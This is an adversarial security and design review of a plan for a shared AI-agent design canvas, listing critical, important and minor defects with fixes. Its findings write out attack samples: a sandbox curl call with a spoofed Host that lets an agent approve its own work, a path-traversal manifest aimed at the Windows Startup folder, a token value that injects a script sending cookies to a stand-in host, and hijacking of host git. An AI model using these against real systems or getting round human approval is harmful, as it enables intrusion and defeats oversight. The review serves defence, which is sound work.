# Phase 5 design canvas plan — adversarial review

**Reviewer:** adversarial plan reviewer (workflow agent), 2026-09-24, on `feat/phase-5-canvas`.
**Plan under review:** `docs/superpowers/plans/2026-09-23-phase-5-design-canvas.md` (515 lines) and
its 30 parts under `2026-09-23-phase-5-design-canvas-parts/`, as of commit `5060cc3`.
**Method:** every citation marked *verified* was opened in the real tree at that commit, or in a
sibling worktree at its current HEAD (hub `c15e6f4`, phase-3 `d785477`, phase-4 `c93fa04`), by
absolute path, read-only. Anything not opened is marked *unverified*. This review compiled and ran
nothing except `sha256sum`/`hashlib` over the digest vector and a module-cache listing.

**Verdict in one line:** a strong, unusually well-evidenced plan with **2 Critical**, **12
Important** and 23 Minor defects, most of the serious ones on the security boundary between agents
and the human's surface.
**Plan quality: Needs fixes** (see Assessment).

---

## Coverage

### Owner decisions

| Decision | Covered? | Where / gap |
|---|---|---|
| OD-1 (build now, adversarial review, UI unmerged) | Yes | plan `:3-6`; task 28 step 2 and task 30 step 6 say *do not merge* |
| OD-2 (worktree = local clone) | Yes | task 22 finds the exclude file with `rev-parse --git-path` (works for a clone). **Gap:** runs host git in an agent-writable clone unhardened — Important I1 |
| OD-3 / OD-5 / OD-6 (shared, Hub, Entra) | Yes | tasks 21, 22; approvals held in memory only (`task-10.md:14-15`, `task-21.md:178`) |
| OD-8 (no PTY meaning; transcript adapter only) | Yes | G5 (`plan:262-264`); nothing reads a transcript |
| OD-9 (cockpit chords win) | Yes | G11, `task-25.md:76-89` prunes against `useKeyboardMap` |
| OD-11 rule 1 (clean room) | Yes | grep of all 30 parts for `Paperdesign|doop|Northstar|agent-plugins`: **0 matches**. `x-clone` traced to the spec's public third-party rules copy [S11] (`paper-design-cleanroom-spec.md:206-218`), renamed |
| OD-11 rule 2 (public behaviour, record URLs) | Yes | via the spec's §12; task 09 step 1 records the DTCG source or says it was blocked |
| OD-11 rule 3 (MIT/Apache/BSD/ISC, gate in CI, no tldraw) | Partly | task 04. **Gaps:** gate holes and an unstated existing MPL fact — Important I9, I10 |
| OD-11 rule 4 (own package, testable alone) | Yes | `canvas/` Go module + `canvas/editor` npm package; boundary tests (`task-05.md:309`, `task-23.md:180`) |
| OD-12 (owner items batched, unverified) | Yes | every UI part's acceptance; task 30 step 5 (seven items) |
| OD-13 (no Panacea) | Yes | plan `:154` |

### Phase 5 brief (`scope-and-risk-phase-5-design.md`, verified)

D3 option A at `:194-206` — covered by `review_mark` (task 06) and re-review (task 21). R4, R6
(script on server; frame forging edits) — deleted by construction (no script anywhere, G7). R5 —
claims and `ifRevision` (task 12). R7 — the relay channel is the credential (tasks 18–19). R8 —
snapshot captured into the Hub (task 21). R9 — one SSE stream per window (task 20). R11 (egress) —
no external URL survives the dialect; the iframe CSP is `default-src 'none'`. R12 (`$`-splice) —
no string splicing exists. R13 (dot grid) — G12 forbids it.

### The clean-room spec's v1 list (§9.1, `paper-design-cleanroom-spec.md:625-641`)

All thirteen items have a task: 1→01, 2→05–13, 3→14–17, 4→18–19, 5→24, 6→25–26, 7→09/17/26,
8→12/25/28, 9→17/28, 10→21/28, 11→22, 12→29, 13→04. The MCP surface matches §8.1–§8.3 tool for
tool (14 read + 13 write + 8 tokens/comments/export/guide = **35**, counted), with `export`'s `jsx`
split into `jsx-inline`/`jsx-tailwind` and `at` added — both improvements. Every §8.4 exclusion
(approve, bind, delete canvas, break claim, list other canvases) is absent and pinned by
`TestNoApproveTool` (`task-16.md:108`).

### The prototype (`prototype/phase-5-design.html`, 577 lines, verified)

`task-28.md:21-31` maps all seven states against the notes at `:486-524` (verified): the R7
access-approval row is deleted, the component tree is now produced, state 6 is split into
control-plane-down vs Hub-down. **Gap:** state 4's *Open rev 5 / Open rev 6* needs phase 4 to render
a past revision read-only (the prototype's own note, `:510`), which task 28 does not list as an
external dependency — Minor M14.

### Citations checked against the real tree

**Verified correct:** `go.work:1`; `azure-pipelines.yml:9-17`; `control-plane/go.mod:52` (x/net
v0.26.0, and `v0.26.0.zip` is in the module cache); `images/sandbox/Dockerfile:3-6, 7-8, 10, 17`;
`harness/argv.go:24-29, 80-125, 91-97`; `harness.go` `Request` has exactly seven fields
(`:105-113`), `ErrUnsupportedOption`, `ErrConversationID`; `api/sessions.go:339, 342, 921-936, 924,
925`; `backend/backend.go:29-38, 177-207`; `backend/dial.go:38-66`; `sandboxd/internal/server/server.go:1,
33-39, 69-90, 105-116`; `sandboxd/go.mod` (coder/websocket); `proxy/proxy.go:9`; `registry.Session`
carries `ProjectID`, `BranchID`, `Title`, `Endpoint`, `AttachToken`, `SandboxID`, `Status`;
`statepath.Dir`; `httpx.MaxBodyBytes = 1 << 20`, `CodeConflict`; `cmd/api/config.go:69-70`;
`api.go:287` (`/api/v1/` alias); `AppShell.tsx:36-43`; `heartbeat.ts` `beatDelayStyle`,
`useHeartbeat`; every token G12/G13 names exists in `desktop/src/styles/tokens.css`;
`routes_audit_test.go:32` `catalogReadOnlyRoutes`; Hub contract §3.2 grammar (`:121`), §7.6
(`:835-861`), §7.7 (`:863-915`), §7.8 (`:917-`), §9.2's five `Designs` methods (`:1293-1299`) and the
PutBlob retry (`:1337`, so HA5-1 is real); Hub `task-04.md:91-100` (seven methods, so HA5-2 is real);
ADR-H1 R5 (`:706`); phase-3 plan `:134` (3-D6) and `:330` (S3-P5.1); phase-4 plan `:169` (P4-A);
`tauri.conf.json:20-21` (`csp: null`).

**Wrong or drifted:** phase-4 plan `:410-412` (cited at plan `:188-189` for S4-P5.1–3) now holds
other text; the seams are at `:457-459` (M9). Plan `:503-505` describes `go-licenses` and
`license-checker` as pinned by task 04, which P5-P and task 04 replaced with our own program (M1).
Plan `:384` says task 02 adds the control plane's `replace`; `task-02.md:104` and G1 say task 19
does (M2). `task-18.md:27` omits `sandboxd/cmd/sandboxd/serve_other.go` (M5).

**Golden vectors, recomputed:** task 05's seven `Between` vectors hold by hand (base-62, `V`=31,
`k`=46, `F`=15). Task 08's vector 1 is 366 bytes and hashes to `d369645a…3ca376`; replacing `@5`
with `@6` gives 366 bytes and `8208d6b8…86cc9b`. Both match the plan.

---

## Strengths

1. **The sanitiser builds nodes, never strings**, and the renderer rebuilds DOM with `createElement`
   from a Go-generated allowlist, re-checking every property; a grep gate (`task-24.md:133`) allows
   exactly one HTML string. There is **no `postMessage` channel at all** — the parent reads the
   same-origin DOM of a script-less iframe — so the origin-check class of bug does not exist.
2. **Identity comes from the channel.** MCP is served only on the tunnel's per-session
   `http.Server`, identity is re-read from the registry on every request, a missing identity is a
   500 (`task-14.md:119`), and no tool can approve, bind or break a claim.
3. **The relay keeps phase 2's direction** (the control plane dials in), binds loopback only
   inside the sandbox, is payload-blind, has per-stream flow control, and pins both codecs to one
   golden file with a byte-equality test. Avoiding yamux (MPL-2.0) is correct.
4. **Unverified assumptions carry stop conditions**: x/net in the cache (`task-07.md:333-335`),
   `claude --help` for the two flags (`task-19.md:140-144`), the spike's decision table
   (`task-01.md:95-103`). The variadic-flag trap is handled twice: flags first, and `validateMCP`
   requires `--session-id` to follow.
5. **Tests are mutation-minded and include negatives**: the spike's `--negative` run, the MPL
   fixture repo, tldraw-declared-MIT, exception laundering, torn-tail vs corrupt-middle logs,
   `TestPrepare_doesNotMutate`, `TestLog_neverArguments`, `TestNothingOnDisk`.
6. **The Hub asks are genuine catches**, each verified: HA5-1 (a retried `io.Reader`), HA5-2 (five
   vs seven methods), HA5-4 (R5's "session context" has no field to live in).

---

## Issues

### Critical

#### C1. "Only a human approves" rests on a guard the plan treats as optional

- **Where:** plan `:103-107` (rule 4: approval *"only through `POST …/approvals`, which no MCP tool
  reaches"*); `task-20.md:62` (the local key *"when it has landed"*); `task-27.md:160-161` (*"until it
  lands the stream is guarded as every other route is"*); `task-21.md:206` (`TestApprove_noMCPPath`
  checks only that no MCP tool maps to the route). Writer's return: *"C3 local caller key
  (optional…)"*.
- **What is wrong:** without Hub task C3 (Hub plan tasks 37–38), the control plane's REST surface is
  guarded only by the Host check and the Origin allowlist. Both are defences against a **browser**:
  `httpx/origin.go:117-123` passes a request with **no** `Origin`, and the Host header is whatever
  the client writes. Sandboxes run on Docker's default bridge (`dockerbe/docker.go:203-204`). The
  Hub contract itself names *"a process in a sandbox that can reach the host's loopback"* as the
  threat the local key exists to stop (`hub-contract.md:1382-1397`, threat T6 at `:2065`, whose
  mitigations list *"no MCP tool approves (phase 5)"* **and** the local key).
- **Failure scenario:** an agent (or a prompt-injected dependency it runs) inside the sandbox sends
  `curl -H "Host: 127.0.0.1:8730" -X POST http://host.docker.internal:8730/v1/design/canvases/<id>/approvals -d '{"revision":12}'`.
  No Origin → allowed; Host spoofed → allowed; the route calls the Hub **as the signed-in user**.
  The agent has approved its own design, which is exactly ADR-H1 R5. The same path reaches route 5
  (edit as `human`, bypassing claims), route 8 (revert another agent), route 9 (break claims), route
  17 (forge the human's selection), route 19 (answer screenshot requests with forged PNGs after
  registering a *visible* renderer on route 20), and route 4 for **any** project's canvas —
  cross-project reads that MCP scope forbids. *Unverified by this review:* that Docker Desktop on
  this fleet forwards `host.docker.internal` to the host's loopback; the Hub contract assumes it can.
- **Why it matters:** the provenance spine's one hard rule — a person approves — becomes a
  convention an agent can ignore.
- **Fix:** make Hub C3 (tasks 37–38) a **hard** dependency of tasks 20, 21, 22 and 27, not optional.
  `designapi.New` takes the key-guard middleware and refuses to build without it. Add a negative
  test per route class (no key → 401 `local_key_required` on routes 5, 8, 9, 17, 19, 20, 21, 24).
  Add to task 30 step 1 a probe from inside the sandbox — the `curl` above — asserting 401, and
  record in the e2e report whether the host was reachable at all.

#### C2. The handoff writes files at paths taken from a shared Hub record, unvalidated

- **Where:** `task-22.md:48-53` (`Materialise`: *"fetch the manifest by its digest, verify its
  SHA-256, fetch and verify every file it lists, write them all"*); `task-21.md:73-106` (the manifest
  carries `files[].path`); Hub contract `:903` (*"What the Hub does not check … the manifest blob's
  contents are phase 5's"*).
- **What is wrong:** SHA-256 proves the bytes match the manifest; it proves nothing about the
  **paths**. The Hub is shared across a team (OD-3), and any member can write an approval with any
  manifest through the Hub API. `Materialise` never says a path must be relative, `/`-separated,
  free of `..`, drive letters, backslashes, `:` (NTFS alternate streams) or reserved names.
- **Failure scenario:** a teammate's client posts an approval whose manifest lists
  `../../../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/x.cmd` as a
  `text/plain; charset=utf-8` blob (an allowed Hub type, `hub-contract.md:841`). The victim clicks
  *Start a Develop session from this design*; the host control plane, running as the victim, writes
  the file outside the worktree; it runs at next sign-in.
- **Why it matters:** code execution on a colleague's machine from shared data.
- **Fix:** in `Materialise`, accept only the names `BuildSnapshot` can produce —
  `^(assets/[0-9a-f]{64}\.(png|jpg|webp|svg)|[a-z0-9-]{1,60}(\.tailwind)?\.(html|png|jsx)|tokens\.(css|json)|tree\.json)$` —
  check `filepath.Rel(tmp, filepath.Join(tmp, p))` never starts with `..`, cap the file count
  (500) and total bytes, and require the manifest's `canvasId`/`designKey` to equal the approval's.
  Tests: `../x`, `/x`, `C:\x`, `a\..\..\x`, `assets/../../x`, `CON.html`, `x.html:s` → `ErrTampered`
  (or a new `ErrUnsafePath`), nothing written.

### Important

#### I1. The handoff trusts an agent-writable clone: unhardened host git, symlinks, a redirectable exclude file

- **Where:** `task-22.md:80-86` (`git -C <worktree> ls-files -- .panacea`, `git -C <worktree>
  rev-parse --git-path info/exclude`, then append); `task-22.md:48-53` (writes through `FS`).
- **What is wrong:** phase 3 establishes that the clone's `.git/config` and every file in it are
  written by the agent, and that *"unhardened, each of those calls is code execution on the Windows
  host"* (`phase-3 …/task-02.md:320-345`, its §HGH command-scope prefix). Task 22 runs bare `git -C`.
  `--git-path` also follows a `.git` **gitfile** the agent can plant (`gitdir: /elsewhere`), so the
  control plane appends to a file of the agent's choosing. And a `.panacea` symlink planted by the
  agent redirects `Materialise`'s writes outside the worktree on a Linux or macOS host
  (*unverified* on Windows, where a container-made symlink may not resolve).
- **Fix:** run both git calls through phase 3's hardened `Exec` (name it as a dependency). Compute
  the exclude path as `<worktree>/.git/info/exclude` only after `Lstat` shows `.git` is a real
  directory; otherwise refuse. `Lstat` every component of `.panacea/design/<canvasId>@<rev>` and
  refuse symlinks and reparse points. Tests: a gitfile `.git`, a symlinked `.panacea`, a clone
  whose config sets `core.fsmonitor=<marker script>` → no marker, nothing written outside.

#### I2. Token values skip the value checks, so a script or a remote URL reaches the export

- **Where:** `task-07.md:125-130` (the global refusals apply to **declarations**);
  `task-05.md:119` and `task-07.md:289` (`TokenValue` only "checks for Type"); `task-07.md:328`
  (`TestTokenValue` has only type positives/negatives); `task-08.md:56` (`ExportHTML` writes tokens
  into a `<style>` element); `task-09.md:125-130` (`tokens.css`); `task-23.md:161-165` (the
  renderer's re-check covers styles, not tokens); `task-24.md:45` (tokens via `setProperty`).
- **Failure scenario:** a prompt-injected agent calls `set_tokens` with `brand` =
  `red}</style><script>fetch('https://x.example/?'+document.cookie)</script><style>` (type
  `font-family`, whose rule is effectively "any"), or `url(https://tracker.example/p.png)`. The
  canvas shows nothing wrong (`setProperty` ignores or the iframe CSP blocks it), the human approves,
  and the exported `<slug>.html` in the bundle runs a script, or fetches a remote URL, the moment a
  person opens it in a browser. `TestExportHTML_standalone` (`task-08.md:145`) would catch it only
  with an adversarial token in its fixture, which the plan does not list.
- **Fix:** `TokenValue` applies `CheckDeclaration`'s global refusals plus `;`, and a `url()` must be
  an `asset:` ref; `allowlist.ts` re-checks token values before `setProperty`. Add the two values
  above to `TestTokenValue` (refused) and to the export test's fixture.

#### I3. The CORS preflight does not allow `PUT`, so two routes fail from the real desktop

- **Where:** `task-20.md:43` (route 11, `PUT …/assets/{sha}`) and `:49` (route 17, `PUT
  …/selection`); `control-plane/internal/httpx/origin.go:169-170` (`corsMethods = "GET, POST, PATCH,
  DELETE, OPTIONS"`) and `:231-236` (the preflight answer).
- **Failure scenario:** every Go and vitest test passes (httptest and an injected `fetch` enforce no
  CORS), then in the Tauri webview the preflight for route 11 omits `PUT` and the browser blocks the
  request: image paste and upload never work, and `get_selection` is always empty because the
  selection is never stored. The phase 2 UI contract recorded this exact trap once already
  (`2026-09-18-phase-2-ui-contract.md` §10.1: *"will not be noticed until the first REST call"*).
- **Fix:** either make both routes `POST`, or amend `corsMethods` (a declared amendment task 30
  records). Add an `httpx` test that the preflight's `Allow-Methods` covers every method the route
  recorder registers, so a new verb cannot drift again.

#### I4. The hidden renderer stops when the window is hidden, which is the product's normal state

- **Where:** P5-Q (`plan:212`), G10 (`plan:281-283`: *"the render queue is driven by
  `requestAnimationFrame` only"*), `task-24.md:65-69` (*"ONE requestAnimationFrame per store
  version"*), `task-24.md:111-117` (the responder uses the live views at head).
- **What is wrong:** Chromium does not run `requestAnimationFrame` callbacks in a hidden document.
  `AGENTIC-UX.md` §3 step 2 makes *LEAVE — the human is gone* the core loop, so a minimised cockpit
  is the common case while agents design.
- **Failure scenario:** the user minimises the cockpit; an agent calls `get_screenshot`; the hidden
  renderer's views never sync the agent's last write (the patch waits for a frame that never
  comes), so the PNG shows the stale artboard, or capture waits and the request times out as
  `renderer-unavailable` though the desktop is running. *Unverified:* whether wry/WebView2 marks a
  minimised window hidden; Chromium's hidden-page behaviour is standard.
- **Fix:** schedule patches with `requestAnimationFrame` while `document.visibilityState ===
  "visible"` and with `queueMicrotask` otherwise (no interval, so G10 holds); the responder calls
  `view.sync()` before it measures or captures. Add spike check S11 (minimise Edge, send a render
  request, record the result) and a responder test with `visibilityState` stubbed `"hidden"`.

#### I5. Approval captures every artboard at 2× inside the agents' 15-second render budget

- **Where:** `task-21.md:167-169` (step 4: *"2× screenshots of every artboard at that revision
  (`authority.Render`, 50 per request)"*); `task-13.md:89-93` (`RenderTimeout = 15 * time.Second`,
  `MaxRenderNodes = 50`); `task-01.md:64` (S8 records fidelity, not time).
- **Failure scenario:** a twelve-screen settings flow; the approval sends one request for twelve
  2× PNGs. Each DOM-to-image capture inlines fonts and images and encodes a PNG in the webview's
  main thread; twelve of them plausibly exceed 15 s (*unverified* — nobody has measured it), and the
  human gets `409 renderer_unavailable`, *"the renderer failed"*, on the one action the spine
  depends on. The same budget serves an agent's one-node screenshot, so the constant cannot simply
  grow.
- **Fix:** approval renders **one artboard per request** with its own deadline (say 30 s), shows
  progress in the approval toast, and fails naming the artboard that failed. Add capture time per
  artboard at 1× and 2× to task 01's S8 matrix, so the deadline is a measured number.

#### I6. Task 20's declared dependencies are wrong, and the waves run it too early

- **Where:** `task-20.md:3` (*"Depends on: 11, 12, 13"*); `task-20.md:192-197` (the wiring calls
  `mcp.NewServer` (task 14), `mcp.Instructions` (17), `mcp.RegisterAll` (15), and
  `mcprelay.NewSupervisor` (19), and passes an `Approvals` port that task 21 creates); plan `:422`
  (wave 4 runs 20 beside 15 and 16, before 17); plan `:425-430` (lane E is "20–22").
- **Failure scenario:** a lane-E worktree agent starts task 20 when 11–13 land, as the plan says it
  may; `cmd/api/main.go` does not compile because `RegisterAll`, `Instructions` and
  `NewSupervisor` do not exist yet. It either stubs them (drift) or blocks, and the user's
  "as much as you can in parallel" plan stalls on a dependency nobody declared.
- **Fix:** split task 20 into **20a** (`designapi` routes, `events`, codes, audit — depends on
  11–13) and **20b** (config and `main.go` wiring — depends on 17, 19 and 20a, with a stub
  `Approvals` returning "none" until 21). Update the waves, the critical path and the lanes.

#### I7. A canvas binding does not follow a branch rename, and outlives a branch delete

- **Where:** `task-10.md:42-49` (`Binding` keyed by local `ProjectID`, `BranchID`); P5-L
  (`plan:207`); `control-plane/internal/project/project.go:118-121` (`BranchID` is a pure function
  of the project id and the branch **name**); phase 3's plan adds branch rename, a rename map
  (`GET /v1/projects/{projectId}/renames`, *old branch id → new branch id*) and branch delete.
- **Failure scenario:** the user renames `feature/login` to `feature/sign-in` (phase 3 allows it for
  a branch with no worktrees); the renamed branch has a new `BranchID`, so the Design lens shows
  state 1, *no canvas*, while the approved design and its Hub approvals sit on a canvas no branch
  shows — a broken thread, which `CLAUDE.md` calls wrong whatever else is good. Conversely,
  deleting `feature/login` and later creating a new `feature/login` derives the same id, so the new
  branch silently inherits the old canvas and its approvals.
- **Fix:** add seam S5-P3.2: `designapi` reads phase 3's rename map and rebinds (one line in
  `bindings.json`, temp file + rename); a branch delete archives the binding so a new branch of the
  same name gets a new canvas. Tests for both.

#### I8. SVG nodes render as nothing without `xmlns`, and their ids collide inside an artboard

- **Where:** `task-07.md:265-280` (`SanitiseSVG` keeps `id` and `url(#id)` verbatim and emits
  `xmlns` only if the input had it); `task-24.md:51-53` (`DOMParser("image/svg+xml")`, then
  `importNode`); `task-24.md:136` (`svgWalk` asserts only that a `d` attribute survives).
- **Failure scenario 1:** an agent writes `<svg viewBox="0 0 24 24"><path d="…"/></svg>` — valid
  inline SVG in HTML, no `xmlns`. The canonical markup has no `xmlns`; the XML parser puts the
  elements in **no namespace**; imported into the artboard they are unknown elements and draw
  nothing. `svgWalk` still passes because it checks for `d`, not for `namespaceURI`.
- **Failure scenario 2:** two icons in one artboard each define `<linearGradient id="paint0_linear">`
  (the Figma export default). Both live in one iframe document, so the second icon's
  `fill="url(#paint0_linear)"` resolves to the first icon's gradient — wrong on the canvas, in the
  PNG and in the exported HTML.
- **Fix:** `SanitiseSVG` always writes the root `xmlns="http://www.w3.org/2000/svg"`, emits
  well-formed XML (escaped `&`, `<`, `"`), and prefixes every kept `id` with the node id, rewriting
  `url(#…)` to match. Tests assert `namespaceURI` in `svgWalk` and distinct ids across two SVG
  nodes.

#### I9. The licence gate has four ways to pass something it should fail

- **Where:** `task-04.md:44-47` (`DeniedNames`, `FirstParty` as name strings), `:119-130`
  (`Classify`), `:146-151` (`NpmDeps`), `:185` (`TestEvaluate_devDepReportsOnly`).
- **What is wrong, each with its failure:**
  1. **A runtime import of a devDependency is bundled but only reported.** Vite bundles whatever
     `src/` imports, whatever `package.json` calls it. An implementer who adds `html-to-image` to
     `canvas/editor`'s `devDependencies` (the file already mirrors the desktop's dev list) ships it
     unchecked. `canvas/editor` ships **source** (`task-03.md:57-60`), so every import it makes ships.
  2. **First party is matched by name.** `"desktop"` and `"@panacea-app/"` would exempt a registry
     package named `desktop-notify` or `@panacea-app/x` if matching is by prefix, as `"@tldraw/"` in
     the deny list implies. The contract does not say which.
  3. **A Go module with no licence file** is not covered by any rule or test.
  4. **`npm ls --json` carries no path**, so how an entry maps to its `package.json` (to read
     `license`) is undefined; the natural guess, `node_modules/<name>`, is wrong for nested copies.
- **Fix:** exempt first party structurally — an `npm ls` link node (`resolved: "file:…"`) and a Go
  `.Module.Main` or local `replace` — never by name. Fail a Go module with no licence file. Read
  `npm ls --all --json --long` (which carries `path`) or `npm query "*"`. Enforce every dependency
  of `canvas/editor` (it ships source) and every devDependency that a file under `desktop/src`
  imports. One test per hole.

#### I10. OQ-P5-2 asks the owner not to scan Cargo without telling them what Cargo holds

- **Where:** plan `:471` (OQ-P5-2) and `task-04.md:224-225` (*"Tauri's own crate tree predates
  OD-11 and is outside this phase"*).
- **What is wrong:** `desktop/src-tauri/Cargo.lock` already lists four MPL-2.0 crates:
  `cssparser 0.36.0` (`:587`), `selectors 0.36.1` (`:2923`), `dtoa-short 0.3.5` (`:850`) and
  `option-ext 0.2.0` (`:2382`) (verified present in the lock; *unverified* which link into the
  release binary). The canvas ships inside that binary. The owner's rule says *"MIT, Apache-2.0,
  BSD or ISC only"*; the recommendation hides a known exception instead of putting it to them.
- **Fix:** have the gate **report** Cargo (`cargo metadata --offline`, report-only, like dev
  dependencies), list the four crates in the first-run report, and rewrite OQ-P5-2 to state them
  so the owner decides with the fact (MPL-2.0 is file-level copyleft; an exception entry may well
  be the answer).

#### I11. A token change restyles other agents' claimed artboards with no notice

- **Where:** plan goal 3 (`:40-43`, *"Many writers never silently collide"*); `task-12.md:101-106`
  (a notice is sent only for a change *"that touched an artboard the caller holds"*); `task-12.md:85`
  and `:203` (tokens carry no revision and no precondition); `task-17.md:48` (`set_tokens`).
- **Failure scenario:** agent S holds *Settings*, agent T holds *Billing*; both use `var(--brand)`.
  T calls `set_tokens` to change `brand`. S's artboard changes colour; S's next result carries no
  notice (no node in S's artboard changed), so S keeps designing against a palette it did not
  choose and cannot see changed. That is a silent collision.
- **Fix:** a token change produces a notice for every session holding an artboard whose subtree
  uses the token (`serialize.TokensUsed`), naming the token and the author; add
  `TestNotices_tokenChange`. Optionally let `set_tokens` take `ifRevision` against a per-token
  revision.

#### I12. Agents cannot realistically place a raster image

- **Where:** `task-16.md:56-58` (`upload_asset` takes base64 in the tool's arguments, up to
  13,981,016 characters); spec `:587` (*"Paper reads local paths"*).
- **What is wrong:** the base64 must be written by the model as tool-call output. A 300 KB logo is
  about 400,000 characters — far beyond a model's output budget for one call — so the
  *code-to-design* flow (put the repository's logo on the canvas) fails for anything but tiny
  images, and the guide does not say what to do instead.
- **Fix (cheap, already possible):** the MCP endpoint is reachable by **any** process in the
  sandbox and is stateless, with identity from the channel, so a shell command can upload a file as
  the session. Ship a short helper in the image (`/usr/local/bin/canvas-upload <file>`, a Node
  script POSTing `upload_asset` to `127.0.0.1:8731/mcp`; the image has Node, `Dockerfile:10`), teach
  it in `canvas-rules`, and state the corollary in the threat model: every sandbox process can act
  on the canvas as its session, within that session's scope.

### Minor

| # | Where | What is wrong | Why it matters | Fix |
|---|---|---|---|---|
| M1 | plan `:503-505` | says task 04 pins `go-licenses` and `license-checker`; P5-P (`:211`) and task 04 replaced both with `tools/licencegate` | a restated fact disagrees with itself | delete the bullet or restate it for the own gate |
| M2 | plan `:384` vs `task-02.md:104`, G1 `:252-253` | row 02 says task 02 adds the control plane's `replace`; the part and G1 say task 19 | an implementer of 02 adds an unused `require`, which `go mod tidy` then removes | fix row 02 |
| M3 | plan `:427-430` | *"the only shared files are …"* misses `designapi/routes.go` (tasks 20–22 in lane E, task 29 in the desktop lane, `task-29.md:14`), `canvas/editor/src/editor/keys.ts` (25 in lane D, 29, `task-29.md:15`) and `go.work` (02, 04) | parallel worktree agents collide on files the plan says are unshared | list them with their order |
| M4 | plan `:353-354`, `:362` | the file map omits `desktop/src/design/docstores.ts`, `selectors.ts` (task 27), `DesignTop.tsx`, `Activity.tsx`, `DesignRenderers.tsx`, `DesignContextChip.tsx` (task 28), `editorPackage.test.tsx` (task 03), and `sandboxd/cmd/sandboxd/serve_posix.go` | the map is the lane-ownership source | complete it |
| M5 | `task-18.md:27` | `newServer`'s signature must change to carry the MCP listener, but `sandboxd/cmd/sandboxd/serve_other.go:13` (the Windows stub) is not in the file list | `go build ./sandboxd/...` fails on the Windows dev machine, where task 18's own acceptance runs | add `serve_other.go` |
| M6 | plan `:305-336` | the npm package `canvas/editor` sits **inside** the Go module `canvas/`; Go 1.23's `./canvas/...` walks `canvas/editor/node_modules` (the `ignore` directive arrives in Go 1.25) | every `go build/test/vet ./canvas/...`, the gate's `go list` and `TestBoundary` walk thousands of npm directories; a stray `.go` file in a package breaks them | add a one-line `canvas/editor/go.mod` (a module boundary Go stops at), or move the Go module to `canvas/core` |
| M7 | `task-08.md:137` | the mutant reads *"`<` in place of `<`"*; it means `<` in place of `<` | the one test that pins `SetEscapeHTML(false)` has an unreadable description | fix the text |
| M8 | `task-14.md:117` | `415` when `Content-Type` is *"not application/json"*; a client may send `application/json; charset=utf-8` | a correct client refused | compare the parsed media type (`mime.ParseMediaType`) |
| M9 | plan `:187-189` | cites the phase-4 plan `:410`–`:412` for S4-P5.1–3; at phase-4 HEAD `c93fa04` they are `:457-459` | citations drift (the plan's own rule 5) | cite by id, re-check lines |
| M10 | `task-21.md:171-174`; Hub contract `:886` | the Hub requires `snapshot.blobs` to be **distinct** digests; identical files (two identical PNGs or JSX files) share one digest | a 400/422 on a legal snapshot; `MaxFiles` counts files, the Hub counts digests | de-duplicate before `Approve`; count distinct digests |
| M11 | `task-20.md:43-44` | route 11 does not say the body's SHA-256 must equal `{sha}`; route 12 serves SVG from the control plane's origin without the Hub's `Content-Disposition: attachment` and `CSP: sandbox` (Hub contract `:855-857`) | a mislabelled asset; an SVG opened from that origin | check the hash (400 on mismatch); add both headers |
| M12 | `task-20.md:37` | route 5 accepts every op kind, including `add_asset` for bytes never stored and `review_mark` with any key | the editor needs six kinds (`task-23.md:153-156`); the rest have routes of their own | allowlist route 5's op kinds |
| M13 | `task-12.md:157-161` | revert-by-session's skip rule (*"a property only if it still has the value the batch set"*) does not say it is checked against the **progressively reverted** state | S sets red, then blue; checked against the head, the red→original inverse is skipped and red remains | check each inverse against the batch's overlay; add that exact test |
| M14 | `task-28.md:28`; prototype `:510` | *Open rev 5 / Open rev 6* needs Discover to render a past brief revision read-only, a phase-4 obligation not listed as task 28's external dependency | the superseded state ships with two dead buttons | add the dependency or hide the buttons until it lands |
| M15 | `task-11.md:160-165`, `:220` | replayed change events must carry each revision's **post-state**, which needs the document at that revision; the contract does not say how, and `TestSubscribe_replay` checks only count and order | an implementer sends current state for old events | specify: replay the log forward from `At(after)` and emit each post-state; assert contents |
| M16 | `task-09.md:49-50`, `:155` | JSX text goes in `{"…"}` but the escaping of `"` and `\` inside it is unstated; the test has neither | text `x"} {fetch(…)} {"` becomes code in the Develop agent's source | encode as a JSON string; test a quote and a backslash |
| M17 | `task-20.md:81-87`; `task-27.md:76` | renderer id is `<window>/<canvasId>`, and a topic change opens the new stream before closing the old | closing the old stream detaches the renderer the new stream just registered | key registrations by stream instance |
| M18 | `task-24.md:96-98`; `task-07.md:179-180` | fonts are the two bundled families plus system fonts; the dialect has no `@font-face` and no font asset, though the Hub already accepts `font/woff2` (`:841`) | *code-to-design* with a repository's brand font is impossible | record as a named v2 seam, or add font assets now |
| M19 | `task-16.md:31` | agents can create pages but not rename or delete them | an agent's page mistakes need a human | add `rename_page`, or record the gap |
| M20 | P5-S (`plan:214`); `task-28.md:91`, `:61` | a toast per `request_review` and counts in the lens sit against `AGENTIC-UX.md` §3 step 2 (*"does not stream notifications"*) and §4 rule 4 (*"fails if a count appears anywhere outside the queue"*); the newest-first activity feed has no scroll anchoring (`DESIGN-SYSTEM.md`: never scroll-jump; §4 rule 11) | small, visible regressions of the UX principles | toast off by default; no counts; anchor the feed when scrolled |
| M21 | `task-07.md:333-335` | `go mod tidy` with `GOPROXY=off` may still need the checksum database for a new `go.sum` line | task 07 stops on a network error the cache could have avoided | copy x/net v0.26.0's two lines from `control-plane/go.sum` first |
| M22 | goal 3 (`plan:40-43`), P5-L (`:207`), `task-30.md:73-74` | agents share a canvas only when sessions share `(project, branch)`. Phase 2's git worktrees cannot share a branch; phase 3's clones can (its plan: clones are *"checked out on the product branch's own name"*) | the claims feature is untestable end to end until phase 3 lands, or needs two sessions in one worktree | say which, in task 30's owner item 3 |
| M23 | `task-14.md:121`, `:123` | under a negotiated `2025-03-26`, JSON-RPC batches are part of the transport; the table refuses them for every revision. Row `:123` calls a response "no `id`" (a response has one; it lacks `method`) | a deviation not recorded in the plan's "not verified" list; a wording error | refuse batches only for ≥ `2025-06-18`, or record the deviation; fix the wording |

---

## Other checks

### Test strategy

Every part has a *Tests first* table, and every row names the mutant it kills — the house style,
kept. Negatives are present where the plan thought of the attack (script vectors, MPL, tldraw,
exception laundering, torn logs, `Origin`, `Host`, oversized frames). The gaps are where it did not:
no test is red for a sandbox calling the human surface (C1), for a hostile manifest path (C2), for a
hostile clone (I1), or for a hostile token value (I2). Two tests cannot fail on the defect they sit
beside: `svgWalk` (I8) and `TestSubscribe_replay` (M15). And two defects are invisible to every test
the plan has, because jsdom and `httptest` enforce neither CORS (I3) nor visibility (I4); each
needs a check in the spike or in task 30's end-to-end run.

### Task sizing and order

77 hours for 30 tasks is honest in total but uneven. Task 20 (twenty routes, the SSE broker,
